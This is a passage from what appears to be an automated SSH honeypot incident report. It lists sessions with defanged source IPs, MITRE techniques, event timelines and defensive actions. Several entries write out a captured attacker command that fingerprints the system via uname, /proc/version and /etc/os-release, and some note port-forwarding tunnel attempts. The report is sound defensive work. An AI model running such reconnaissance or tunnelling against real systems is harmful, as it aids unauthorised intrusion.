| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:00:50` | `cowrie.session.connect` |
| `2026-07-09 18:00:50` | `cowrie.client.version` |
| `2026-07-09 18:00:51` | `cowrie.client.kex` |
| `2026-07-09 18:00:51` | `cowrie.login.success` |
| `2026-07-09 18:00:52` | `cowrie.session.params` |
| `2026-07-09 18:00:52` | `cowrie.command.input` |
| `2026-07-09 18:00:52` | `cowrie.command.input` |
| `2026-07-09 18:00:52` | `cowrie.command.input` |
| `2026-07-09 18:00:52` | `cowrie.command.input` |
| `2026-07-09 18:00:52` | `cowrie.command.input` |
| `2026-07-09 18:00:52` | `cowrie.command.success` |
| `2026-07-09 18:00:52` | `cowrie.command.input` |
| `2026-07-09 18:00:52` | `cowrie.command.input` |
| `2026-07-09 18:00:52` | `cowrie.command.input` |
| `2026-07-09 18:00:52` | `cowrie.command.input` |
| `2026-07-09 18:00:52` | `cowrie.log.closed` |
| `2026-07-09 18:00:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f32361ea2cb5

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 18:01 |
| **Last Seen** | 2026-07-09 18:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:01:46` | `cowrie.session.connect` |
| `2026-07-09 18:01:47` | `cowrie.client.version` |
| `2026-07-09 18:01:47` | `cowrie.client.kex` |
| `2026-07-09 18:01:53` | `cowrie.login.success` |
| `2026-07-09 18:01:56` | `cowrie.session.params` |
| `2026-07-09 18:01:56` | `cowrie.command.input` |
| `2026-07-09 18:01:57` | `cowrie.log.closed` |
| `2026-07-09 18:01:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-763360921769

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:02 |
| **Last Seen** | 2026-07-09 18:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:02:21` | `cowrie.session.connect` |
| `2026-07-09 18:02:21` | `cowrie.client.version` |
| `2026-07-09 18:02:21` | `cowrie.client.kex` |
| `2026-07-09 18:02:22` | `cowrie.login.success` |
| `2026-07-09 18:02:23` | `cowrie.session.params` |
| `2026-07-09 18:02:23` | `cowrie.command.input` |
| `2026-07-09 18:02:23` | `cowrie.command.input` |
| `2026-07-09 18:02:23` | `cowrie.command.input` |
| `2026-07-09 18:02:23` | `cowrie.command.input` |
| `2026-07-09 18:02:23` | `cowrie.command.input` |
| `2026-07-09 18:02:23` | `cowrie.command.success` |
| `2026-07-09 18:02:23` | `cowrie.command.input` |
| `2026-07-09 18:02:23` | `cowrie.command.input` |
| `2026-07-09 18:02:23` | `cowrie.command.input` |
| `2026-07-09 18:02:23` | `cowrie.command.input` |
| `2026-07-09 18:02:23` | `cowrie.log.closed` |
| `2026-07-09 18:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39ed93b5652b

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]3` |
| **First Seen** | 2026-07-09 18:02 |
| **Last Seen** | 2026-07-09 18:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:02:44` | `cowrie.session.connect` |
| `2026-07-09 18:02:45` | `cowrie.client.version` |
| `2026-07-09 18:02:45` | `cowrie.client.kex` |
| `2026-07-09 18:02:47` | `cowrie.login.success` |
| `2026-07-09 18:02:48` | `cowrie.direct-tcpip.request` |
| `2026-07-09 18:02:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]3` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40c084bc769e

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-09 18:03 |
| **Last Seen** | 2026-07-09 18:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:03:19` | `cowrie.session.connect` |
| `2026-07-09 18:03:19` | `cowrie.client.version` |
| `2026-07-09 18:03:19` | `cowrie.client.kex` |
| `2026-07-09 18:03:20` | `cowrie.login.success` |
| `2026-07-09 18:03:21` | `cowrie.session.params` |
| `2026-07-09 18:03:21` | `cowrie.command.input` |
| `2026-07-09 18:03:22` | `cowrie.log.closed` |
| `2026-07-09 18:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8210d9bc4e71

| Field | Detail |
|---|---|
| **Source IP** | `124.88.174[.]143` |
| **First Seen** | 2026-07-09 18:03 |
| **Last Seen** | 2026-07-09 18:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:03:30` | `cowrie.session.connect` |
| `2026-07-09 18:03:31` | `cowrie.client.version` |
| `2026-07-09 18:03:31` | `cowrie.client.kex` |
| `2026-07-09 18:03:34` | `cowrie.login.success` |
| `2026-07-09 18:03:35` | `cowrie.direct-tcpip.request` |
| `2026-07-09 18:03:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.88.174[.]143` to AbuseIPDB if not already reported
- [ ] Block `124.88.174[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d9204e188e5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:04 |
| **Last Seen** | 2026-07-09 18:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:04:06` | `cowrie.session.connect` |
| `2026-07-09 18:04:06` | `cowrie.client.version` |
| `2026-07-09 18:04:06` | `cowrie.client.kex` |
| `2026-07-09 18:04:07` | `cowrie.login.success` |
| `2026-07-09 18:04:07` | `cowrie.session.params` |
| `2026-07-09 18:04:07` | `cowrie.command.input` |
| `2026-07-09 18:04:07` | `cowrie.command.input` |
| `2026-07-09 18:04:07` | `cowrie.command.input` |
| `2026-07-09 18:04:07` | `cowrie.command.input` |
| `2026-07-09 18:04:07` | `cowrie.command.input` |
| `2026-07-09 18:04:07` | `cowrie.command.success` |
| `2026-07-09 18:04:07` | `cowrie.command.input` |
| `2026-07-09 18:04:07` | `cowrie.command.input` |
| `2026-07-09 18:04:07` | `cowrie.command.input` |
| `2026-07-09 18:04:07` | `cowrie.command.input` |
| `2026-07-09 18:04:07` | `cowrie.log.closed` |
| `2026-07-09 18:04:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9433ec3b78f8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:06 |
| **Last Seen** | 2026-07-09 18:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:06:02` | `cowrie.session.connect` |
| `2026-07-09 18:06:02` | `cowrie.client.version` |
| `2026-07-09 18:06:02` | `cowrie.client.kex` |
| `2026-07-09 18:06:03` | `cowrie.login.success` |
| `2026-07-09 18:06:03` | `cowrie.session.params` |
| `2026-07-09 18:06:03` | `cowrie.command.input` |
| `2026-07-09 18:06:03` | `cowrie.command.input` |
| `2026-07-09 18:06:03` | `cowrie.command.input` |
| `2026-07-09 18:06:03` | `cowrie.command.input` |
| `2026-07-09 18:06:03` | `cowrie.command.input` |
| `2026-07-09 18:06:03` | `cowrie.command.success` |
| `2026-07-09 18:06:03` | `cowrie.command.input` |
| `2026-07-09 18:06:03` | `cowrie.command.input` |
| `2026-07-09 18:06:03` | `cowrie.command.input` |
| `2026-07-09 18:06:03` | `cowrie.command.input` |
| `2026-07-09 18:06:04` | `cowrie.log.closed` |
| `2026-07-09 18:06:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d73f69f23d7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:07 |
| **Last Seen** | 2026-07-09 18:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:07:41` | `cowrie.session.connect` |
| `2026-07-09 18:07:41` | `cowrie.client.version` |
| `2026-07-09 18:07:41` | `cowrie.client.kex` |
| `2026-07-09 18:07:42` | `cowrie.login.success` |
| `2026-07-09 18:07:43` | `cowrie.session.params` |
| `2026-07-09 18:07:43` | `cowrie.command.input` |
| `2026-07-09 18:07:43` | `cowrie.command.input` |
| `2026-07-09 18:07:43` | `cowrie.command.input` |
| `2026-07-09 18:07:43` | `cowrie.command.input` |
| `2026-07-09 18:07:43` | `cowrie.command.input` |
| `2026-07-09 18:07:43` | `cowrie.command.success` |
| `2026-07-09 18:07:43` | `cowrie.command.input` |
| `2026-07-09 18:07:43` | `cowrie.command.input` |
| `2026-07-09 18:07:43` | `cowrie.command.input` |
| `2026-07-09 18:07:43` | `cowrie.command.input` |
| `2026-07-09 18:07:43` | `cowrie.log.closed` |
| `2026-07-09 18:07:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29369235ec5f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:09 |
| **Last Seen** | 2026-07-09 18:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:09:14` | `cowrie.session.connect` |
| `2026-07-09 18:09:14` | `cowrie.client.version` |
| `2026-07-09 18:09:14` | `cowrie.client.kex` |
| `2026-07-09 18:09:15` | `cowrie.login.success` |
| `2026-07-09 18:09:16` | `cowrie.session.params` |
| `2026-07-09 18:09:16` | `cowrie.command.input` |
| `2026-07-09 18:09:16` | `cowrie.command.input` |
| `2026-07-09 18:09:16` | `cowrie.command.input` |
| `2026-07-09 18:09:16` | `cowrie.command.input` |
| `2026-07-09 18:09:16` | `cowrie.command.input` |
| `2026-07-09 18:09:16` | `cowrie.command.success` |
| `2026-07-09 18:09:16` | `cowrie.command.input` |
| `2026-07-09 18:09:16` | `cowrie.command.input` |
| `2026-07-09 18:09:16` | `cowrie.command.input` |
| `2026-07-09 18:09:16` | `cowrie.command.input` |
| `2026-07-09 18:09:16` | `cowrie.log.closed` |
| `2026-07-09 18:09:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a470c3cc41cc

| Field | Detail |
|---|---|
| **Source IP** | `200.37.179[.]83` |
| **First Seen** | 2026-07-09 18:09 |
| **Last Seen** | 2026-07-09 18:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:09:19` | `cowrie.session.connect` |
| `2026-07-09 18:09:20` | `cowrie.client.version` |
| `2026-07-09 18:09:20` | `cowrie.client.kex` |
| `2026-07-09 18:09:21` | `cowrie.login.success` |
| `2026-07-09 18:09:22` | `cowrie.direct-tcpip.request` |
| `2026-07-09 18:09:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.37.179[.]83` to AbuseIPDB if not already reported
- [ ] Block `200.37.179[.]83` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c185e03409b3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:10 |
| **Last Seen** | 2026-07-09 18:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:10:43` | `cowrie.session.connect` |
| `2026-07-09 18:10:43` | `cowrie.client.version` |
| `2026-07-09 18:10:43` | `cowrie.client.kex` |
| `2026-07-09 18:10:43` | `cowrie.login.success` |
| `2026-07-09 18:10:44` | `cowrie.session.params` |
| `2026-07-09 18:10:44` | `cowrie.command.input` |
| `2026-07-09 18:10:44` | `cowrie.command.input` |
| `2026-07-09 18:10:44` | `cowrie.command.input` |
| `2026-07-09 18:10:44` | `cowrie.command.input` |
| `2026-07-09 18:10:44` | `cowrie.command.input` |
| `2026-07-09 18:10:44` | `cowrie.command.success` |
| `2026-07-09 18:10:44` | `cowrie.command.input` |
| `2026-07-09 18:10:44` | `cowrie.command.input` |
| `2026-07-09 18:10:44` | `cowrie.command.input` |
| `2026-07-09 18:10:44` | `cowrie.command.input` |
| `2026-07-09 18:10:44` | `cowrie.log.closed` |
| `2026-07-09 18:10:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ec71e69202a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-09 18:11 |
| **Last Seen** | 2026-07-09 18:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:11:20` | `cowrie.session.connect` |
| `2026-07-09 18:11:20` | `cowrie.client.version` |
| `2026-07-09 18:11:20` | `cowrie.client.kex` |
| `2026-07-09 18:11:21` | `cowrie.login.success` |
| `2026-07-09 18:11:21` | `cowrie.direct-tcpip.request` |
| `2026-07-09 18:11:21` | `cowrie.direct-tcpip.data` |
| `2026-07-09 18:11:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed59de82d189

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:12 |
| **Last Seen** | 2026-07-09 18:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:12:19` | `cowrie.session.connect` |
| `2026-07-09 18:12:19` | `cowrie.client.version` |
| `2026-07-09 18:12:20` | `cowrie.client.kex` |
| `2026-07-09 18:12:20` | `cowrie.login.success` |
| `2026-07-09 18:12:21` | `cowrie.session.params` |
| `2026-07-09 18:12:21` | `cowrie.command.input` |
| `2026-07-09 18:12:21` | `cowrie.command.input` |
| `2026-07-09 18:12:21` | `cowrie.command.input` |
| `2026-07-09 18:12:21` | `cowrie.command.input` |
| `2026-07-09 18:12:21` | `cowrie.command.input` |
| `2026-07-09 18:12:21` | `cowrie.command.success` |
| `2026-07-09 18:12:21` | `cowrie.command.input` |
| `2026-07-09 18:12:21` | `cowrie.command.input` |
| `2026-07-09 18:12:21` | `cowrie.command.input` |
| `2026-07-09 18:12:21` | `cowrie.command.input` |
| `2026-07-09 18:12:21` | `cowrie.log.closed` |
| `2026-07-09 18:12:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-914c4a7aee88

| Field | Detail |
|---|---|
| **Source IP** | `35.130.111[.]146` |
| **First Seen** | 2026-07-09 18:12 |
| **Last Seen** | 2026-07-09 18:17 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:12:36` | `cowrie.session.connect` |
| `2026-07-09 18:12:37` | `cowrie.client.version` |
| `2026-07-09 18:12:37` | `cowrie.client.kex` |
| `2026-07-09 18:12:38` | `cowrie.login.success` |
| `2026-07-09 18:12:38` | `cowrie.direct-tcpip.request` |
| `2026-07-09 18:17:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.130.111[.]146` to AbuseIPDB if not already reported
- [ ] Block `35.130.111[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea8bcb6b5b69

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 18:13 |
| **Last Seen** | 2026-07-09 18:13 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:13:01` | `cowrie.session.connect` |
| `2026-07-09 18:13:02` | `cowrie.client.version` |
| `2026-07-09 18:13:02` | `cowrie.client.kex` |
| `2026-07-09 18:13:08` | `cowrie.login.success` |
| `2026-07-09 18:13:11` | `cowrie.session.params` |
| `2026-07-09 18:13:11` | `cowrie.command.input` |
| `2026-07-09 18:13:13` | `cowrie.log.closed` |
| `2026-07-09 18:13:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0135deafd6f5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:14 |
| **Last Seen** | 2026-07-09 18:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
